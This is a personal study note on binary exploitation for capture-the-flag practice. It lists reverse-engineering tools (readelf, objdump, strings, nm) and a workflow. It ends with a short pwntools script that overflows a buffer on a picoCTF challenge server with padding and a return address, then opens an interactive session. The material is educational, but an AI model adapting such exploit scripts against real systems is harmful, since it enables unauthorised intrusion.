---
topic:
course:
tags:
  - binaryexploitation
created: 11 Feb 2026 @ 02:03 pm
modified: 11 Feb 2026 @ 04:32 pm
aliases:
  - PWN
  - BETools
---
### definition


#### useful
Tools:
```bash
file flaghasher  
```

detailed ELF headers, sections, symbols
```shell
readelf -a binary
```
disassembly + sections
```shell
objdump -d binary
objdump -x binary
```
extract printable strings
```shell
strings binary
```
list symbols
```bash
nm binary
```
##  workflow pwn/reversing:

1. `file` → architecture
2. `checksec` → protections - 
3. `strings` → quick hints
4. `readelf` / `objdump` → structure
5. Ghidra/radare2 → reverse logic
6. gdb + pwndbg → runtime debugging
7. pwntools → exploit scripting


**pwntools**
https://docs.pwntools.com/en/stable/

Used in python
e.g
```Python
from pwn import *
context.binary="chall"

#p=process('chall')
p=remote('mimas.picoctf.net',52044)
payload=b'A'*32
payload+=p64(0x4011a0)
p.sendlineafter('Enter your choice:','2')
p.sendline(payload)
p.sendlineafter('Enter your choice:','4')
p.interactive()
```